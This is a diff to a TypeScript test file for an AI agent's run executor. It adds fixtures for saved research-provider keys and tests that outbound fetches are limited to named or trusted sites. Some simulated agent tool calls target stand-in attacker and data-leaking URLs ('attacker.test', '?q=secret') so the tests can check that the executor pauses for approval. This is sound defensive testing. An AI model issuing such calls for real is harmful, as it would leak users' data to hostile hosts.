@@ -143,9 +143,12 @@ function fixture({
   browser,
   spendingLimit = null,
   memoryProvider,
+  researchKey,
 }: {
   /** The Space's semantic memory provider; none by default. */
   memoryProvider?: Record<string, unknown>;
+  /** A web research key the run's user saved; its provider answers from `researchFetch`. */
+  researchKey?: { provider: string; key: string };
   /** A page browser on a graphical computer, so browser_act and computer_act are offered. */
   browser?: BrowserProvider;
   /** The user's spending limit for payments. */
@@ -488,8 +491,16 @@ function fixture({
       ),
     },
     secret: {
-      findMany: vi.fn(async () => []),
-      findFirst: vi.fn(async () => ({ id: "review-secret", ciphertext: "fake-cipher" })),
+      findMany: vi.fn(async (query?: { where?: { kind?: { in?: string[] } } }) =>
+        researchKey && query?.where?.kind?.in?.includes(`research-key:${researchKey.provider}`)
+          ? [{ kind: `research-key:${researchKey.provider}` }]
+          : [],
+      ),
+      findFirst: vi.fn(async (query?: { where?: { kind?: unknown } }) =>
+        researchKey && query?.where?.kind === `research-key:${researchKey.provider}`
+          ? { id: "research-secret", ciphertext: "research-cipher" }
+          : { id: "review-secret", ciphertext: "fake-cipher" },
+      ),
     },
     usageRecord: {
       createMany: vi.fn(async () => ({ count: 1 })),
@@ -560,6 +571,18 @@ function fixture({
   }[] = [{ args: { id: "item-1" }, executionId: "call-1" }];
   const web = new FakeWebProvider();
   const fetchedUrls: string[] = [];
+  /** What the research provider was asked for: page URLs read, and searches. */
+  const researchRequests: Record<string, unknown>[] = [];
+  const researchFetch = vi.fn<typeof globalThis.fetch>(async (_url, init) => {
+    const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
+    researchRequests.push(body);
+    return typeof body.url === "string"
+      ? Response.json({
+          success: true,
+          data: { markdown: "# Page", metadata: { title: "Page", statusCode: 200 } },
+        })
+      : Response.json({ results: [{ url: "https://found.test/article", title: "Found" }] });
+  });
   const fakeFetch = web.fetch.bind(web);
   web.fetch = async (request, context) => {
     fetchedUrls.push(request.url);
@@ -685,9 +708,18 @@ function fixture({
     jobs: { enqueue },
     secrets,
     autoReview: nativeReview ? undefined : autoReviewProvider,
-    secretStore: { load: async () => "fake-review-api-key" },
+    secretStore: {
+      load: async (ref: string) =>
+        ref === "research-cipher" && researchKey
+          ? JSON.stringify(researchKey)
+          : "fake-review-api-key",
+    },
     shutdownSignal,
     web,
+    research: {
+      fetch: researchFetch,
+      resolveHostname: async () => [{ address: "203.0.113.10", family: 4 }],
+    },
     userDevices,
   } as unknown as Parameters<typeof createRunExecutor>[0]);
   return {
@@ -698,6 +730,8 @@ function fixture({
     spending: spending.state,
     web,
     fetchedUrls,
+    researchFetch,
+    researchRequests,
     fleetBots,
     instructionState,
     liveBot,
@@ -3394,6 +3428,66 @@ describe("outbound destinations", () => {
     await f.run();
     expect(f.fetchedUrls).toEqual([]);
     expect(isApprovalPausedResult(f.results[0])).toBe(true);
+  });
+
+  it("reads a page with a saved page-reading key only on named sites, asking before others", async () => {
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      researchKey: { provider: "firecrawl", key: "fake-page-key" },
+    });
+    f.setCalls([
+      {
+        name: "firecrawl_scrape",
+        args: { url: "https://docs.example.com/guide" },
+        executionId: "call-1",
+      },
+      {
+        name: "firecrawl_scrape",
+        args: { url: "https://attacker.test/?q=x" },
+        executionId: "call-2",
+      },
+    ]);
+    await f.run();
+    expect(f.offeredTools()).toContain("firecrawl_scrape");
+    expect(f.offeredTools()).not.toContain("exa_search");
+    expect(f.researchRequests.map((body) => body.url)).toEqual(["https://docs.example.com/guide"]);
+    expect(f.results[0]).toMatchObject({ title: "Page", text: "# Page" });
+    expect(JSON.stringify(f.results)).not.toContain("fake-page-key");
+    expect(isApprovalPausedResult(f.results[1])).toBe(true);
+    expect(pausedCard(f)).toMatchObject({ site: "attacker.test" });
+  });
+
+  it("trusts a keyed search result's exact URL, as for web_search", async () => {
+    const f = fixture({ builtin: true, researchKey: { provider: "exa", key: "fake-search-key" } });
+    f.setCalls([
+      { name: "exa_search", args: { query: "news" }, executionId: "call-1" },
+      { name: "web_fetch", args: { url: "https://found.test/article" }, executionId: "call-2" },
+      { name: "web_fetch", args: { url: "https://found.test/?q=secret" }, executionId: "call-3" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://found.test/article"]);
+    expect(isApprovalPausedResult(f.results[2])).toBe(true);
+    expect(JSON.stringify(f.results)).not.toContain("fake-search-key");
+  });
+
+  it("offers no keyed research tool without a saved key, and never calls its provider", async () => {
+    // A runtime refuses a tool it was not offered; a stale call that still arrives gets the fallback.
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://example.com/",
+    });
+    f.setCalls([
+      { name: "firecrawl_scrape", args: { url: "https://example.com/" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.offeredTools()).toEqual(expect.arrayContaining(["web_search", "web_fetch"]));
+    expect(f.offeredTools()).not.toContain("exa_search");
+    expect(f.offeredTools()).not.toContain("firecrawl_scrape");
+    expect(JSON.stringify(f.results[0])).toContain("web_search and web_fetch");
+    expect(f.researchFetch).not.toHaveBeenCalled();
   });
 
   it("refuses a URL that is not http(s)", async () => {
